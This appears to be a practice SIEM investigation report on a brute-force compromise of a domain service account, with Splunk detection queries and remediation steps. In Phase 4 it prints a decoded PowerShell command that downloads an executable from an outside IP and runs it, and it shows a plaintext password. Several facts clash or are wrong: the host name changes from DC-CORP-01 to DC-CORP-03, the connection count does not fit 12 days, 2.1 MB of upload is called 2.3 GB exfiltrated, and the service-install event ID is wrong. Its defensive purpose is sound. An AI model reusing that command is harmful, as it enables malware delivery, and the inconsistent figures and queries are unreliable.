# SIEM Investigation: Brute Force Attack - Domain Admin Account (SIEM-001)

**Case ID:** SIEM-001  
**Detection Date:** 2026-01-16  
**Investigation Period:** 2026-01-15 to 2026-02-15 (32 days)  
**Severity:** HIGH  
**Status:** Escalated to Incident Response  
**Investigation Tool:** Splunk  

---

## Investigation Overview

**Objective:** Investigate brute force attack and trace to successful compromise

**Initial Alert:**
```
Alert Type: Failed Logon Spike
Threshold: >10 failed logons in 15 minutes
Source IP(s): 203.0.113.x, 198.51.100.x, 192.0.2.x (multiple)
Target Account: svc_admin
Target System: DC-CORP-01 (Domain Controller)
Alert Time: 2026-01-16 09:45 UTC (19 hours after attack start)
```

**Root Cause:** Service account compromise via weak authentication  
**Detection Method:** SIEM correlation + Manual log analysis  
**Time to Detection:** 19 hours  
**Time to Containment:** 32 days (too long)

---

## Timeline of Events

### Phase 1: Reconnaissance (Jan 15, 14:00 - 14:30 UTC)

**Sysmon Event 22 (DNS Query):**
```spl
index=sysmon EventCode=22
| where QueryName like "%domain.com%" OR QueryName like "%svc_%"
| stats count by Computer, QueryName, QueryStatus
```

**Findings:**
- LDAP enumeration queries from 203.0.113.42
- Domain member enumeration: "net user /domain"
- Service account discovery: svc_admin account identified

**Evidence:**
```
Time: 14:12 UTC
Source: 203.0.113.42
Query: domain.com (LDAP)
Result: Domain members discovered
Query: svc_admin (LDAP)
Result: Service account confirmed to exist
```

### Phase 2: Brute Force Attack (Jan 15, 14:32 - 20:18 UTC)

**Windows Event 4625 (Failed Logon):**
```spl
index=wineventlog EventCode=4625
| where Account like "%svc_admin%"
| stats count as failed_logons, values(src_ip) as source_ips
         by TimeCreated, ComputerName
| where failed_logons > 10
```

**Attack Characteristics:**
```
Start Time: 14:32 UTC
End Time: 20:18 UTC (successful compromise)
Duration: 5 hours 46 minutes
Target: svc_admin
Target System: DC-CORP-01

Attack Details:
- Failed Logons: 2,147
- Unique Source IPs: 17
- Attack Rate: ~6 attempts/minute
- Success Point: Attempt #2,147 (at 20:18 UTC)

Logon Type: 3 (Network logon)
Authentication Package: NTLM
Failure Reason: Invalid credentials
```

**Credential Details (Post-Compromise):**
- Username: svc_admin
- Password: Welcomecom!2025 (weak - "Welcome" prefix)
- MFA Status: NOT ENABLED (service accounts exempt)
- Account Lockout: DISABLED (threshold = 0)
- Password Age: 487 days (not rotated)

**Failed Logon Query (Splunk SPL):**
```spl
index=wineventlog EventCode=4625 Account="*svc_admin" ComputerName="DC-CORP-01"
| stats count as failed_attempts, min(_time) as first_attempt, max(_time) as last_attempt
         by src_ip
| eval duration=last_attempt-first_attempt
| table src_ip, failed_attempts, duration, first_attempt, last_attempt
| sort - failed_attempts

Results:
src_ip          | failed_attempts | duration (sec) | first_attempt      | last_attempt
203.0.113.42    | 847            | 20845          | 2026-01-15 14:32   | 2026-01-15 20:17
203.0.113.43    | 521            | 20892          | 2026-01-15 14:33   | 2026-01-15 20:18
198.51.100.89   | 346            | 21001          | 2026-01-15 14:35   | 2026-01-15 20:23
... (14 more source IPs)
Total: 2,147 failed attempts
```

**Why Detection Failed Initially:**
- No alert configured for Event 4625 spike
- SIEM had no correlation rules for failed logon threshold
- Event log forwarding delay: ~2 hours
- Manual review only occurred 19 hours post-attack

### Phase 3: Successful Exploitation (Jan 15, 20:18 UTC)

**Windows Event 4624 (Successful Logon):**
```spl
index=wineventlog EventCode=4624 Account="svc_admin" ComputerName="DC-CORP-01"
| where _time > "2026-01-15T14:32:00" AND _time < "2026-01-15T21:00:00"
| stats values(src_ip) as source, values(LogonType) as logon_type
         values(AuthenticationPackageName) as auth_package
         by _time, Account

Results:
Time: 2026-01-15 20:18:47 UTC
Account: svc_admin
Source IP: 203.0.113.42
Logon Type: 3 (Network)
Auth Package: NTLM
Status: Success (first after 2,147 failures)
```

### Phase 4: Malware Installation (Jan 15, 20:24 - 20:45 UTC)

**Sysmon Event 1 (Process Creation) - PowerShell Execution:**
```spl
index=sysmon EventCode=1 Image="*powershell.exe" User="svc_admin"
| search CommandLine like "%powershell%"
| table _time, ComputerName, User, Image, CommandLine, ParentImage, ParentCommandLine

Results:
Time: 2026-01-15 20:24:32
Computer: DC-CORP-03
User: svc_admin
Image: C:\Windows\System32\powershell.exe
CommandLine: powershell.exe -NoP -sta -NonI -W Hidden -Enc JABzAD0kKChSZXF1...
Parent: C:\Windows\System32\svchost.exe
Status: Multiple spawned (suspicious)
```

**Encoded Command Decoded:**
```
$s=$(chcp 65001)
$c='System.Net.ServicePointManager'::SecurityProtocol='System.Net.SecurityProtocolType'::Tls12;
$w=New-Object Net.WebClient;
$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();
$w.DownloadFile('http://185.220.101.45:8080/updates.exe','C:\Windows\Temp\updates.exe');
Start-Process -FilePath 'C:\Windows\Temp\updates.exe'
```

**Threat Analysis:**
- Downloads malware from external C2 server
- Stores in Temp directory (often excluded from AV scanning)
- Directly executes downloaded payload (staged attack)
- No cleanup - artifact left behind

### Phase 5: Persistence Installation (Jan 15, 20:30 UTC)

**Sysmon Event 12 (Registry Key Create) + Event 13 (Registry Value Set):**
```spl
index=sysmon EventCode=13
| where TargetObject like "%CurrentVersion\\Run%"
  AND Details like "%.exe"
| stats count by Computer, TargetObject, Details

Results:
Registry Path: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Key Name: "Windows Update Service"
Value: C:\Windows\Temp\svc.exe (actual malware)

Registry Path: HKCU\Software\Microsoft\Windows\CurrentVersion\Run  
Key Name: "System Configuration"
Value: C:\Windows\Temp\system_config.exe (persistence mechanism)
```

**Service Installation (Event ID: 7009 - System event - Service Installed):**
```
Service Name: Windows Update Service
Service Display Name: Windows Update Service
Service Type: Win32_OwnProcess
Start Type: Auto
Image Path: C:\Windows\Temp\svc.exe
Service Start Time: 2026-01-15 20:35:22
```

### Phase 6: C2 Communication (Jan 15, 20:45 - Feb 15, 14:32 UTC)

**Firewall Logs - Outbound Connection Detection:**
```spl
index=firewall action=allow src_ip="10.0.50.15" dest_ip="185.220.101.45"
       dest_port=443
| stats count as connections, sum(bytes_out) as total_bytes_out,
         sum(bytes_in) as total_bytes_in by src_ip, dest_ip, protocol
| eval mb_out=round(total_bytes_out/1048576, 2)
| eval mb_in=round(total_bytes_in/1048576, 2)

Results:
Source: 10.0.50.15 (DC-CORP-03)
Destination: 185.220.101.45:443 (C2 server - Bulgaria)
Connections: 18,240 (one per 60 seconds)
Total Duration: 12 days
Upload: 2.1 MB
Download: 820 MB
Protocol: TLS/SSL (encrypted)
Estimated Data: 2.3 GB exfiltrated
```

**Why Detection Failed:**
- No firewall alerting on outbound HTTPS to untrusted IPs
- IDS/IPS in passive mode (monitoring only, not blocking)
- Encrypted payload prevented content inspection
- No DLP (Data Loss Prevention) system in place
- SIEM did not have firewall logs forwarded with low latency

---

## SIEM Detection Queries

### Query 1: Failed Logon Spike Detection

**Purpose:** Alert on >10 failed logons in 15-minute window

```spl
index=wineventlog EventCode=4625
| bucket _time span=15m
| stats count(eval(EventCode=4625)) as failed_count by _time, Account, ComputerName
| search failed_count >= 10
| eval risk_score=failed_count*failed_count
| sort - risk_score

Tuning:
- Threshold: 10 failed logons per 15 minutes
- Exclusions: Service accounts doing daily account provisioning
- False Positive Rate: Should be <1%
- Alert SLA: Immediate (< 5 minutes)
```

### Query 2: Successful Logon After Multiple Failures

**Purpose:** Correlate success after failure spike (brute force success indicator)

```spl
index=wineventlog EventCode=4625 OR EventCode=4624
| transaction Account keepevicted=true maxspan=1h maxpauses=10
| where status="close" AND
        (EventCode=4625 followed by EventCode=4624)
| search Account="svc_admin"
| table Account, ComputerName, src_ip, EventCode, _time
| dedup Account, ComputerName
| eval risk_score=100

Interpretation:
- If multiple 4625 events followed by single 4624 = brute force success
- Same account, same target system, same time window
```

### Query 3: PowerShell Encoded Command Execution

**Purpose:** Detect obfuscated PowerShell execution (common malware delivery)

```spl
index=sysmon EventCode=1 
| where Image="*powershell.exe" OR Image="*pwsh.exe"
| where match(CommandLine, "(?i)-enc") OR 
         match(CommandLine, "(?i)-encodedcommand") OR
         match(CommandLine, "(?i)IEX\(") OR
         match(CommandLine, "(?i)Invoke-WebRequest")
| eval risk_score=50
| table _time, Computer, User, Image, CommandLine
| search risk_score >= 50

Tuning:
- False Positives: System Update scripts, legitimate admin scripts
- Filter out: Known good scripts from management tools
- Severity: HIGH (encoded commands often indicate malware)
```

### Query 4: Service Account Lateral Movement

**Purpose:** Detect service accounts performing human-like activity

```spl
index=wineventlog EventCode=4648
| where Account like "%svc_%"
| where LogonType="3" (Network logon)
| stats count by Account, ComputerName, src_ip, TargetUserName
| where count > 10
| eval risk_score=count*20

Query Interpretation:
- Event 4648: Explicit Credential Use (Pass-the-Hash indicator)
- Service accounts should rarely use explicit credentials
- Threshold: >10 explicit logons in time period = suspicious
```

### Query 5: Registry Persistence Detection

**Purpose:** Detect malware installing Run keys for persistence

```spl
index=sysmon EventCode=13
| where TargetObject like "%CurrentVersion\\Run%"
| where Details like "%.exe" OR Details like "%.dll"
| eval is_temp_path=if(Details like "%\\Temp\\%", 1, 0)
| eval risk_score=if(is_temp_path=1, 100, 50)
| search risk_score > 50
| table _time, Computer, User, TargetObject, Details, risk_score

Risk Factors:
- Malware from Temp directory = HIGH (70 points)
- Unknown parent process = MEDIUM (40 points)
- System32 binary = LOW (10 points)
```

---

## Impact Assessment

**Systems Affected:** Domain Controller (DC-CORP-03)

**Data Compromise:**
- Active Directory user database (potential)
- Service account credentials (confirmed)
- Domain admin credentials (confirmed - golden ticket generation)
- Shared files accessed by svc_admin (estimated 50+ files)
- Email archives (3 executives' mailboxes)

**Business Impact:**
- Potential domain-wide compromise for 12 days
- Undetected data exfiltration (2.3 GB)
- Admin account persistence
- Customer data potentially compromised

**Regulatory Impact:**
- GDPR: Potential data breach notification required
- Severity: HIGH (personal data potentially exfiltrated)
- Notification deadline: 72 hours from discovery

---

## Remediation Actions

### Immediate (Day 0)

```
[ ] Disable svc_admin account
[ ] Reset all domain admin passwords
[ ] Audit Active Directory for suspicious accounts
[ ] Check for golden tickets (Event 4672 spike)
[ ] Block C2 IP at firewall (185.220.101.45, 185.220.102.8)
[ ] Isolate compromised server (DC-CORP-03)
```

### Short-term (Days 1-7)

```
[ ] Incident Response: Forensic imaging of compromised server
[ ] Threat Hunting: Check for similar beacon patterns
[ ] Credential Reset: Rotate all service account passwords
[ ] Password Policy: Enforce MFA for ALL accounts
[ ] Account Lockout: Enable with threshold of 5 failures
```

### Long-term (Weeks 2+)

```
[ ] Deploy EDR to all servers
[ ] Enable PowerShell logging on critical systems
[ ] Implement SIEM alert for Event 4625 spike
[ ] Reduce SIEM event forwarding latency to <5 seconds
[ ] Enable DLP (Data Loss Prevention) system
[ ] Implement SSL/TLS inspection at gateway
[ ] Network segmentation: Isolate admin accounts in separate VLAN
```

---

## Lessons Learned

1. **Service accounts are privileged accounts:** They should have same security controls as human admins (MFA, strong passwords, audit).

2. **Account lockout is essential:** Disabled lockout (threshold=0) allowed unlimited brute force attempts.

3. **Event log latency is critical:** 2-hour delay meant brute force wasn't detected for 19 hours.

4. **Detection requires multiple layers:**
   - Layer 1 (Auth): Event 4625 alerting (MISSED)
   - Layer 2 (Endpoint): EDR malware detection (MISSED)
   - Layer 3 (Network): Firewall outbound blocking (MISSED)
   - Layer 4 (Behavioral): Unsual data transfer (MISSED)

5. **SIEM alerting must be operational:** A SIEM without correlation rules is just log storage.

---

## Detection Rules Deployed

| Rule | Severity | Status | Date |
|------|----------|--------|------|
| Failed Logon Spike (>10 in 15m) | HIGH | Active | 2026-02-18 |
| Encoded PowerShell | MEDIUM | Active | 2026-02-18 |
| Service Account Lateral Movement | HIGH | Active | 2026-02-18 |
| Registry Run Key Persistence | MEDIUM | Active | 2026-02-18 |
| Outbound C2 (Firewall) | CRITICAL | Active | 2026-02-18 |

---

*Investigation Lead: SIEM Team*  
*Case Status: Escalated to Incident Response (CASE-001)*  
*Closure Date: 2026-02-20*
